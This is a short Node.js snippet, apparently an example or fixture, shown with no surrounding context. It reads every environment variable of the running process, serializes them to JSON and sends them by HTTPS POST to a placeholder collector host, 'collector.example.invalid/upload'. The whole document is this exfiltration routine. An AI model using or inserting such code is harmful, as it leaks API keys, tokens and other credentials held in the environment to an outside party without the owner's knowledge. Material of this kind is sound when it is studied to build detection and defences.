const https = require('https');
const payload = JSON.stringify(process.env);
const req = https.request('https://collector.example.invalid/upload', { method: 'POST' });
req.end(payload);
